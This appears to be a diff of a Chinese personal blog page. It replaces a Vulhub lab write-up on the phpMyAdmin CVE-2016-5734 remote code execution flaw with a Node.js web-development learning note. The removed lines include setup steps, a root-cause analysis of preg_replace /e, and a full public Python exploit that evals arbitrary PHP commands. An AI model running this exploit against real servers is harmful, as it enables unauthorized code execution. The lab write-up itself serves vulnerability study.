@@ -15,24 +15,20 @@
 
 
 
-<meta name="description" content="前言 今天继续来看phpmyadmin的漏洞，顺便审一下它的源码">
-<meta name="keywords" content="Vulhub,漏洞复现">
+<meta name="description" content="前言 这部分进行如何使用Node.js进行Web开发的学习">
+<meta name="keywords" content="WEB后端，Node.js">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Vulhub-phpmyadmin4.0.x-4.6.2远程代码执行漏洞">
-<meta property="og:url" content="http://yoursite.com/2018/10/23/Vulhub-phpmyadmin4-0-x-4-6-2远程代码执行/index.html">
+<meta property="og:title" content="NodeJs学习笔记3">
+<meta property="og:url" content="http://yoursite.com/2019/08/29/NodeJs学习笔记3/index.html">
 <meta property="og:site_name" content="DoubleR&#39;s BLOG">
-<meta property="og:description" content="前言 今天继续来看phpmyadmin的漏洞，顺便审一下它的源码">
+<meta property="og:description" content="前言 这部分进行如何使用Node.js进行Web开发的学习">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/41.jpg">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/9.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/10.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/11.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/12.png">
-<meta property="og:updated_time" content="2018-12-15T14:27:24.693Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/12.jpg">
+<meta property="og:updated_time" content="2019-08-29T01:41:16.237Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Vulhub-phpmyadmin4.0.x-4.6.2远程代码执行漏洞">
-<meta name="twitter:description" content="前言 今天继续来看phpmyadmin的漏洞，顺便审一下它的源码">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/41.jpg">
+<meta name="twitter:title" content="NodeJs学习笔记3">
+<meta name="twitter:description" content="前言 这部分进行如何使用Node.js进行Web开发的学习">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/12.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -64,7 +60,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Vulhub-phpmyadmin4.0.x-4.6.2远程代码执行漏洞 | DoubleR&#39;s BLOG</title>
+<title>NodeJs学习笔记3 | DoubleR&#39;s BLOG</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -316,11 +312,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-Vulhub-phpmyadmin4-0-x-4-6-2远程代码执行" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-NodeJs学习笔记3" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/10/23/Vulhub-phpmyadmin4-0-x-4-6-2远程代码执行/" class="article-date">
-      <time datetime="2018-10-23T13:00:22.000Z" itemprop="datePublished">2018-10-23</time>
+      <a href="/2019/08/29/NodeJs学习笔记3/" class="article-date">
+      <time datetime="2019-08-29T01:04:42.000Z" itemprop="datePublished">2019-08-29</time>
 </a>
 
 
@@ -335,7 +331,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Vulhub-phpmyadmin4.0.x-4.6.2远程代码执行漏洞
+      NodeJs学习笔记3
     </h1>
   
 
@@ -344,7 +340,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-keyboard-o"></i>
 			<span class="post-meta-item-text"> 字数统计: </span>
-			<span class="post-count">1,133字</span>
+			<span class="post-count">755字</span>
 		</span>
 	</span>
 	
@@ -353,7 +349,7 @@
 		<span class="post-meta-item-icon">
 			<i class="fa fa-hourglass-half"></i>
 			<span class="post-meta-item-text"> 阅读时长: </span>
-			<span class="post-count">6分</span>
+			<span class="post-count">3分</span>
 		</span>
 	</span>
 </div>
@@ -366,7 +362,7 @@
 
         
     <div class="article-tag tagcloud" style="margin-top:30px;">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Vulhub/">Vulhub</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB后端，Node-js/">WEB后端，Node.js</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -377,46 +373,38 @@
       
           
         <p><strong>前言</strong></p>
-<p>今天继续来看phpmyadmin的漏洞，顺便审一下它的源码</p>
+<p>这部分进行如何使用Node.js进行Web开发的学习</p>
 <hr>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/41.jpg" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/BLOG/12.jpg" alt=""></p>
 <a id="more"></a>
-<hr>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。</p>
-<p>连接服务器，进入目录：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ../vulhub/phpmyadmin/CVE-2016-5734</span><br></pre></td></tr></table></figure>
-<p>创建镜像，启动容器：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>环境启动后，访问<code>http://your-ip:8080</code>，即可以看到phpmyadmin登陆界面，账号root，密码root。</p>
-<p>受影响的版本：</p>
-<ul>
-<li>4.0.10.16之前4.0.x版本</li>
-<li>4.4.15.7之前4.4.x版本</li>
-<li>4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞）</li>
-</ul>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>cve-2016-5734的漏洞问题出现在TableSearch.class.php中的_getRegexReplaceRows函数,让我们看看这个函数:</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/9.png" alt=""></p>
-<p>我们仔细来看第1407-1415行，当查询到结果时，它会用preg_replace进行替换，这个函数我在之前的文章中有讲过它会导致代码执行。preg_replace漏洞触发有两个前提：</p>
-<ul>
-<li>第一个参数需要e标识符，有了它可以执行第二个参数的命令 </li>
-<li>第一个参数需要在第三个参数中的中有匹配，不然echo会返回第三个参数而不执行命令。</li>
-</ul>
-<p>$find变量是写在正则里面的，$replaceWith变量是要进行替换的内容，也就是要被执行的代码。我们回溯这两个变量，发现在getReplacePreview函数中有调用这个_getRegexReplaceRows函数：</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/10.png" alt=""></p>
-<p>我们继续回溯，在tbl_find_replace.php文件中发现了变量的数据来源</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/11.png" alt=""></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这个漏洞目前没法直接利用，因为有token限制，需要登陆抓到token，所以说我们不许知道数据库连接的账号和密码。同时需要构造第三个参数保证和第一个参数匹配上，第一个参数可控，但是第三个参数是从数据库中取出的，所以只能提前插入到数据库中，然后再取出来。</p>
-<p>但是网上有现有的POC可以使用，我这里贴出代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">__author__ = <span class="string">"@iamsecurity"</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">"url"</span>, type=str, help=<span class="string">"URL with path to PMA"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-c"</span>, <span class="string">"--cmd"</span>, type=str, help=<span class="string">"PHP command(s) to eval()"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-u"</span>, <span class="string">"--user"</span>, required=<span class="keyword">True</span>, type=str, help=<span class="string">"Valid PMA user"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-p"</span>, <span class="string">"--pwd"</span>, required=<span class="keyword">True</span>, type=str, help=<span class="string">"Password for valid PMA user"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-d"</span>, <span class="string">"--dbs"</span>, type=str, help=<span class="string">"Existing database at a server"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-T"</span>, <span class="string">"--table"</span>, type=str, help=<span class="string">"Custom table name for exploit."</span>)</span><br><span class="line">    arguments = parser.parse_args()</span><br><span class="line">    url_to_pma = arguments.url</span><br><span class="line">    uname = arguments.user</span><br><span class="line">    upass = arguments.pwd</span><br><span class="line">    <span class="keyword">if</span> arguments.dbs:</span><br><span class="line">        db = arguments.dbs</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        db = <span class="string">"test"</span></span><br><span class="line">    token = <span class="keyword">False</span></span><br><span class="line">    custom_table = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">if</span> arguments.table:</span><br><span class="line">        custom_table = <span class="keyword">True</span></span><br><span class="line">        table = arguments.table</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table = <span class="string">"prgpwn"</span></span><br><span class="line">    <span class="keyword">if</span> arguments.cmd:</span><br><span class="line">        payload = arguments.cmd</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">"system('uname -a');"</span></span><br><span class="line"> </span><br><span class="line">    size = <span class="number">32</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    <span class="comment"># you can manually add proxy support it's very simple ;)</span></span><br><span class="line">    <span class="comment"># s.proxies = &#123;'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"&#125;</span></span><br><span class="line">    s.verify = <span class="keyword">False</span></span><br><span class="line">    sql = <span class="string">'''CREATE TABLE `&#123;0&#125;` (</span></span><br><span class="line"><span class="string">      `first` varchar(10) CHARACTER SET utf8 NOT NULL</span></span><br><span class="line"><span class="string">    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span></span><br><span class="line"><span class="string">    INSERT INTO `&#123;0&#125;` (`first`) VALUES (UNHEX('302F6500'));</span></span><br><span class="line"><span class="string">    '''</span>.format(table)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># get_token</span></span><br><span class="line">    resp = s.post(url_to_pma + <span class="string">"/?lang=en"</span>, dict(</span><br><span class="line">        pma_username=uname,</span><br><span class="line">        pma_password=upass</span><br><span class="line">    ))</span><br><span class="line">    <span class="keyword">if</span> resp.status_code <span class="keyword">is</span> <span class="number">200</span>:</span><br><span class="line">        token_place = resp.text.find(<span class="string">"token="</span>) + <span class="number">6</span></span><br><span class="line">        token = resp.text[token_place:token_place + <span class="number">32</span>]</span><br><span class="line">    <span class="keyword">if</span> token <span class="keyword">is</span> <span class="keyword">False</span>:</span><br><span class="line">        print(<span class="string">"Cannot get valid authorization token."</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> custom_table <span class="keyword">is</span> <span class="keyword">False</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"is_js_confirmed"</span>: <span class="string">"0"</span>,</span><br><span class="line">            <span class="string">"db"</span>: db,</span><br><span class="line">            <span class="string">"token"</span>: token,</span><br><span class="line">            <span class="string">"pos"</span>: <span class="string">"0"</span>,</span><br><span class="line">            <span class="string">"sql_query"</span>: sql,</span><br><span class="line">            <span class="string">"sql_delimiter"</span>: <span class="string">";"</span>,</span><br><span class="line">            <span class="string">"show_query"</span>: <span class="string">"0"</span>,</span><br><span class="line">            <span class="string">"fk_checks"</span>: <span class="string">"0"</span>,</span><br><span class="line">            <span class="string">"SQL"</span>: <span class="string">"Go"</span>,</span><br><span class="line">            <span class="string">"ajax_request"</span>: <span class="string">"true"</span>,</span><br><span class="line">            <span class="string">"ajax_page_request"</span>: <span class="string">"true"</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        resp = s.post(url_to_pma + <span class="string">"/import.php"</span>, data, cookies=requests.utils.dict_from_cookiejar(s.cookies))</span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"success"</span> <span class="keyword">in</span> resp.json():</span><br><span class="line">                <span class="keyword">if</span> resp.json()[<span class="string">"success"</span>] <span class="keyword">is</span> <span class="keyword">False</span>:</span><br><span class="line">                    first = resp.json()[<span class="string">"error"</span>][resp.json()[<span class="string">"error"</span>].find(<span class="string">"&lt;code&gt;"</span>)+<span class="number">6</span>:]</span><br><span class="line">                    error = first[:first.find(<span class="string">"&lt;/code&gt;"</span>)]</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">"already exists"</span> <span class="keyword">in</span> error:</span><br><span class="line">                        print(error)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(<span class="string">"ERROR: "</span> + error)</span><br><span class="line">                        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># build exploit</span></span><br><span class="line">    exploit = &#123;</span><br><span class="line">        <span class="string">"db"</span>: db,</span><br><span class="line">        <span class="string">"table"</span>: table,</span><br><span class="line">        <span class="string">"token"</span>: token,</span><br><span class="line">        <span class="string">"goto"</span>: <span class="string">"sql.php"</span>,</span><br><span class="line">        <span class="string">"find"</span>: <span class="string">"0/e\0"</span>,</span><br><span class="line">        <span class="string">"replaceWith"</span>: payload,</span><br><span class="line">        <span class="string">"columnIndex"</span>: <span class="string">"0"</span>,</span><br><span class="line">        <span class="string">"useRegex"</span>: <span class="string">"on"</span>,</span><br><span class="line">        <span class="string">"submit"</span>: <span class="string">"Go"</span>,</span><br><span class="line">        <span class="string">"ajax_request"</span>: <span class="string">"true"</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = s.post(</span><br><span class="line">        url_to_pma + <span class="string">"/tbl_find_replace.php"</span>, exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">        result = resp.json()[<span class="string">"message"</span>][resp.json()[<span class="string">"message"</span>].find(<span class="string">"&lt;/a&gt;"</span>)+<span class="number">8</span>:]</span><br><span class="line">        <span class="keyword">if</span> len(result):</span><br><span class="line">            print(<span class="string">"result: "</span> + result)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        print(</span><br><span class="line">            <span class="string">"Exploit failed!\n"</span></span><br><span class="line">            <span class="string">"Try to manually set exploit parameters like --table, --database and --token.\n"</span></span><br><span class="line">            <span class="string">"Remember that servers with PHP version greater than 5.4.6"</span></span><br><span class="line">            <span class="string">" is not exploitable, because of warning about null byte in regexp"</span></span><br><span class="line">        )</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<p>具体使用：</p>
-<p><img src="https://raw.githubusercontent.com/doubler12138/Blog/master/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87/Vulhub/phpmyadmin/12.png" alt=""></p>
-<hr>
-<p><strong>参考链接：</strong></p>
-<p><a href="https://vulhub.org/#/environments/phpmyadmin/CVE-2016-5734/" target="_blank" rel="noopener">Vulhub-phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞（CVE-2016-5734）</a></p>
-<p><a href="https://www.jianshu.com/p/8e44cb1b5b5b" target="_blank" rel="noopener">简书-phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞（CVE-2016-5734）</a></p>
-<hr>
-<div align="center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1591272&auto=1&height=66"></iframe></div>
+<div align="center"><br>    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1386212483&auto=1&height=66"></iframe><br></div>
 
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>在通过Node.js进行Web开发之前，我们需要了解到Node.js与传统的后端语言不同的地方。传统架构中的HTTP服务器的角色由Apache、Nignx和IIS之类的软件来担任，但是Node.js不需要。Node.js提供了HTTP模块，可以直接应用到生产环境。</p>
+<p>Node.js和其它的语言相比还有一个显著的区别，在于它的原始封装程度较低。</p>
+<h3 id="使用http模块"><a href="#使用http模块" class="headerlink" title="使用http模块"></a>使用http模块</h3><p>Node.js由于不需要另外的HTTP服务器，因此减少了一层抽象，给性能带来了不少的提升，但是同时的也提高了开发难度。我们以一个简单的post表单的提交和获取来举例。</p>
+<p>我们首先来写一个提交页面</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://localhost:3000/"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"title"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">"text"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个表单包含了两个字段：title和text，提交时以post的方式提交到本地的3000端口，假设我们现在要将两个字段的内容原封不动的返还给用户端。这里我们就要使用Node.js的http模块。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">"querystring"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> post = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">	req.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>) </span>&#123;</span><br><span class="line">		post += chunk;</span><br><span class="line">	&#125;)</span><br><span class="line">	req.on(<span class="string">"end"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		post = querystring.parse(post);</span><br><span class="line">		res.write(post.title);</span><br><span class="line">		res.write(post.text);</span><br><span class="line">		res.end()</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;).listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
+<p>分析整个过程，我们先创建了一个http实例，在其请求处理函数中中手动编写req对象的时间监听器。当客户端请求到达时，我们将Post数据暂时存放在闭包变量中，直到end事件触发，解析POST请求，处理后返回给客户端。</p>
+<p>整个过程显得复杂的原因是因为Node.js的http模块提供的是底层的接口。虽然使用起来相对复杂，但是可以加深我们对http协议的理解。</p>
+<p>但是如果我们在生产环境中直接使用http模块进行开发，整个开发过程会相对十分复杂。所以我们需要一个完整的框架来提供相应的接口。</p>
+<h3 id="express框架"><a href="#express框架" class="headerlink" title="express框架"></a>express框架</h3><p>express作为开发框架，是目前最稳定、使用最广泛的，而且是Node.js官方推荐的唯一一个Web开发框架。</p>
+<p>Express除了为http模块提供了更高层的接口外，还是实现了许多功能，包括：</p>
+<ul>
+<li>路由控制</li>
+<li>模板解析支持</li>
+<li>动态视图</li>
+<li>用户会话</li>
+<li>CSRF保护</li>
+<li>静态文件服务</li>
+<li>错误控制器</li>
+<li>访问日志</li>
+<li>缓存</li>
+<li>插件支持</li>
+</ul>
+<p>如果我们要使用express框架实现上一个例子的功能，我们可以将代码压缩到十行之内</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">"express"</span>);</span><br><span class="line"><span class="keyword">var</span> app = express.createServer();</span><br><span class="line">app.use(express.bodyParser());</span><br><span class="line">app.all(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    res.send(req.body.title, req.body.text);</span><br><span class="line">&#125;)</span><br><span class="line">app.listend(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -425,13 +413,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/10/23/Vulhub-phpmyadmin4-0-x-4-6-2远程代码执行/">Vulhub-phpmyadmin4.0.x-4.6.2远程代码执行漏洞</a></p>
+        <p><span>本文标题:</span><a href="/2019/08/29/NodeJs学习笔记3/">NodeJs学习笔记3</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Double--R</a></p>
-        <p><span>发布时间:</span>2018-10-23, 21:00:22</p>
-        <p><span>最后更新:</span>2018-12-15, 22:27:24</p>
+        <p><span>发布时间:</span>2019-08-29, 09:04:42</p>
+        <p><span>最后更新:</span>2019-08-29, 09:41:16</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/10/23/Vulhub-phpmyadmin4-0-x-4-6-2远程代码执行/" title="Vulhub-phpmyadmin4.0.x-4.6.2远程代码执行漏洞">http://yoursite.com/2018/10/23/Vulhub-phpmyadmin4-0-x-4-6-2远程代码执行/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/10/23/Vulhub-phpmyadmin4-0-x-4-6-2远程代码执行/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/08/29/NodeJs学习笔记3/" title="NodeJs学习笔记3">http://yoursite.com/2019/08/29/NodeJs学习笔记3/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/08/29/NodeJs学习笔记3/　　作者: Double--R" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -443,16 +431,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/10/28/SECCON-2018-CTF-GhostKingdom-Write-up/">
-                    SECCON 2018 CTFGhostKingdom Writeup
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/10/21/Vulhub-ActiveMQ-反序列化漏洞/">
-                    Vulhub-ActiveMQ--反序列化漏洞
+                <a href="/2019/08/28/JavaScript学习笔记5/">
+                    JavaScript学习笔记5
                 </a>
             </div>
         
@@ -464,7 +446,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞原理"><span class="toc-number">2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#准备工作"><span class="toc-number">1.</span> <span class="toc-text">准备工作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用http模块"><span class="toc-number">1.1.</span> <span class="toc-text">使用http模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#express框架"><span class="toc-number">1.2.</span> <span class="toc-text">express框架</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -500,7 +482,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Vulhub-phpmyadmin4.0.x-4.6.2远程代码执行漏洞　| DoubleR's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
